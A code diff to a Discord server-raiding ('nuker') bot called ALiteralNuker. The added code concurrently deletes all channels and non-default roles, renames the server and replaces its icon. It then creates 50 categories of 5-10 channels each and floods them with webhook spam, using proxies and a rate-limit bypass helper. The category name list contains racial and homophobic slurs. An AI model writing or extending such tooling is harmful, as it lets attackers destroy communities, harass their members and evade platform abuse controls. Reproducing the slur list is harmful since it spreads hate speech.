@@ -675,15 +675,58 @@ while True:
             repeat = 50  # Fixed to 50 messages per channel
             channel_names = parse_list_input(console.input("[cyan]Enter channel names (comma-separated): "))
 
-            # Delete channels
-            for channel in guild.channels:
+            async def delete_channel(channel):
                 try:
                     await channel.delete()
                     console.print(f"[red]Deleted channel: {channel.name}")
                 except Exception as e:
                     logging.error(f"Failed to delete channel {channel.name}: {e}")
 
-            # Create channels and start spamming
+            async def delete_role(role):
+                try:
+                    await role.delete()
+                    console.print(f"[red]Deleted role: {role.name}")
+                except Exception as e:
+                    logging.error(f"Failed to delete role {role.name}: {e}")
+
+            async def create_and_spam_channel(channel_name, proxy, category=None):
+                try:
+                    channel = await guild.create_text_channel(channel_name, category=category)
+                    console.print(f"[green]Created channel: {channel_name} in category: {category.name if category else 'None'}")
+                    
+                    # Create webhooks and start spamming
+                    webhook_tasks = []
+                    for _ in range(5):
+                        webhook = await rate_limit_bypass.create_webhook_with_retry(channel)
+                        if webhook:
+                            webhook_tasks.append(rate_limit_bypass.spam_with_webhook(webhook.url, messages, repeat, attach_spam))
+                    
+                    return channel, webhook_tasks
+                except Exception as e:
+                    logging.error(f"Failed to create/spam channel {channel_name}: {e}")
+                    return None, []
+
+            async def create_category_with_channels(category_name, num_channels, proxy):
+                try:
+                    # Create category with random position
+                    category = await guild.create_category(
+                        name=category_name,
+                        position=random.randint(0, 100)
+                    )
+                    console.print(f"[green]Created category: {category_name}")
+
+                    # Create channels in this category
+                    channel_tasks = []
+                    for _ in range(num_channels):
+                        channel_name = random.choice(channel_names)
+                        channel_tasks.append(create_and_spam_channel(channel_name, proxy, category))
+                    
+                    return category, channel_tasks
+                except Exception as e:
+                    logging.error(f"Failed to create category {category_name}: {e}")
+                    return None, []
+
+            # Start all operations concurrently
             with Progress(
                 SpinnerColumn(),
                 TextColumn("[progress.description]{task.description}"),
@@ -691,65 +734,67 @@ while True:
                 TaskProgressColumn(),
                 console=console
             ) as progress:
-                # Create channels
-                channel_task = progress.add_task("[cyan]Creating channels...", total=35)
+                # Create tasks for all operations
+                delete_channel_tasks = [delete_channel(channel) for channel in guild.channels]
+                delete_role_tasks = [delete_role(role) for role in guild.roles if role.name != "@everyone"]
                 
-                channel_tasks = []
-                for _ in range(35):
-                    channel_name = random.choice(channel_names)
-                    proxy = rate_limit_bypass.get_channel_proxy()
-                    channel_tasks.append(create_channel_with_proxy(guild, channel_name, proxy))
-                
-                # Wait for all channels to be created
-                channels = await asyncio.gather(*channel_tasks)
-                channels = [c for c in channels if c is not None]
-                progress.update(channel_task, completed=35)
-
-                # Start spamming in all channels
-                console.print("[cyan]Starting spam in all channels...")
-                total_messages = len(channels) * repeat * 5  # Total messages across all channels
-                spam_task = progress.add_task("[cyan]Sending messages...", total=total_messages)
-                
-                spam_tasks = []
-                for channel in channels:
-                    try:
-                        # Start spam task with increased message count
-                        spam_tasks.append(rate_limit_bypass.spam_channel(channel, messages, repeat * 5, attach_spam, progress, spam_task))
-                        console.print(f"[green]Started spam in channel: {channel.name}")
-                    except Exception as e:
-                        logging.error(f"Failed to start spam in channel {channel.name}: {e}")
-                        continue
-
-                # Start all spam tasks simultaneously
-                if spam_tasks:
-                    await asyncio.gather(*spam_tasks)
-                else:
-                    console.print("[red]No channels were created successfully!")
-
-            # Delete roles
-            for role in guild.roles:
+                # Start server modifications
+                server_mod_tasks = []
                 try:
-                    await role.delete()
-                    console.print(f"[red]Deleted role: {role.name}")
+                    server_mod_tasks.append(guild.edit(name="Nuked by ALiteralNuker"))
+                    icon_path = os.path.join(assets_folder, "icon.jpg")
+                    if os.path.exists(icon_path):
+                        with open(icon_path, "rb") as icon:
+                            icon_bytes = icon.read()
+                            server_mod_tasks.append(guild.edit(icon=icon_bytes))
                 except Exception as e:
-                    logging.error(f"Failed to delete role {role.name}: {e}")
+                    logging.error(f"Failed to modify server: {e}")
 
-            # Server name change & icon change
-            try:
-                await guild.edit(name="Nuked by ALiteralNuker")
-                console.print("[cyan]Changed server name!")
+                # Wait for initial cleanup
+                await asyncio.gather(*delete_channel_tasks, *delete_role_tasks, *server_mod_tasks)
+                console.print("[green]Initial cleanup completed!")
 
-                icon_path = os.path.join(assets_folder, "icon.jpg")
-                if os.path.exists(icon_path):
-                    with open(icon_path, "rb") as icon:
-                        icon_bytes = icon.read()
-                        await guild.edit(icon=icon_bytes)
-                        console.print("[cyan]Changed server icon!")
-                else:
-                    console.print("[yellow]⚠️ No icon found in ALiteralNuker/assets/icon.jpg ⚠️")
-            except Exception as e:
-                logging.error(f"Failed to edit server: {e}")
-                console.print(f"[red]Failed to change server name/icon: {e}")
+                # Create categories and channels
+                category_task = progress.add_task("[cyan]Creating categories and channels...", total=50)  # Create 50 categories
+                
+                # Generate random category names
+                category_names = [
+                    "NUKED", "RAIDED", "DESTROYED", "DELETED", "GONE", "BYE", "RIP",
+                    "FUCKED", "SHIT", "ASS", "DICK", "PUSSY", "CUNT", "BITCH",
+                    "NIGGER", "FAGGOT", "RETARD", "IDIOT", "STUPID", "DUMB",
+                    "WASTE", "TRASH", "GARBAGE", "JUNK", "CRAP", "SHITTY",
+                    "FUCKING", "SHITTING", "DESTROYING", "DELETING", "REMOVING",
+                    "KILLING", "ENDING", "FINISHING", "COMPLETING", "DONE",
+                    "OVER", "FINISHED", "COMPLETED", "ENDED", "KILLED",
+                    "DEAD", "DIED", "GONE", "LOST", "MISSING", "ABSENT",
+                    "AWAY", "GONE", "LEFT", "DEPARTED"
+                ]
+
+                category_tasks = []
+                for _ in range(50):  # Create 50 categories
+                    category_name = random.choice(category_names)
+                    proxy = rate_limit_bypass.get_channel_proxy()
+                    # Create 5-10 channels per category
+                    num_channels = random.randint(5, 10)
+                    category_tasks.append(create_category_with_channels(category_name, num_channels, proxy))
+                
+                # Process all categories and their channel tasks
+                results = await asyncio.gather(*category_tasks)
+                webhook_tasks = []
+                for category, channel_tasks in results:
+                    if category:
+                        # Process channel tasks for this category
+                        channel_results = await asyncio.gather(*channel_tasks)
+                        for _, tasks in channel_results:
+                            if tasks:
+                                webhook_tasks.extend(tasks)
+                
+                # Start all webhook spam tasks
+                if webhook_tasks:
+                    await asyncio.gather(*webhook_tasks)
+                
+                progress.update(category_task, completed=50)
+                console.print("[green]Nuke operation completed!")
 
         bot.run(bot_token)
 
